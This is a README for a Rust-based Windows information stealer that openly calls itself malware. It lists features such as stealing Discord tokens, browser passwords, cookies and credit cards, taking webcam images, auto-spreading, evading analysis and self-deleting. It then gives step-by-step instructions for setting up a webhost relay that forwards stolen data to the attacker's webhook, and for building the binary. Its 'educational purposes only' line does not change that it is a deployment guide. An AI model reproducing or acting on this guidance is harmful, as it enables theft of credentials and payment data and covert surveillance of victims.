### Note
If this reprository is useful to you in in any shape or form please give it a star.

### Educational purposes only
Don't use this project maliciously. 

### How it works
This is a malware written in Rust that steals the information the attacker chooses to steal and sends that through a server to the attacker's webhook.

### Info
This is a lot faster than other grabbers due to not using regex to find tokens and due to rust being a faster language overall. This grabber also keeps your webhook secure from any reverse engineers preventing it from being deleted.

### Features
- Grab IP Address
- Anti analysis
- Webhook protection
- Auto spread
- Site blocker
- Self-delete
- Copy to temp
- Trace token
- Steal discord tokens
- Steal browser passwords
- Steal browser cookies
- Steal browsing history
- Steal credit cards
- Take screenshot
- Take webcam image

### Prerequisites
1. Install [Rust](https://www.rust-lang.org/tools/install)
2. Install the windows [toolchain](https://rust-lang.github.io/rustup/installation/windows.html)
3. Install [CMake](https://cmake.org/download/)
4. Make sure CMake is in your [PATH Environment Variable](https://learn.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ee537574(v=office.14))

### Setup
1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php#L3) and set the webhook
2. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) to your webhost's `public_html` folder
4. Configure the options in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs) however you like
5. Make sure your [webhost](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) has `/upload.php` at the end
5. Run `cargo build --release --target=x86_64-pc-windows-msvc`

### Contributing
1. Fork it
2. Create your branch (`git checkout -b my-change`)
3. Commit your changes (`git commit -am 'changed something'`)
4. Push to the branch (`git push origin my-change`)
5. Create new pull request
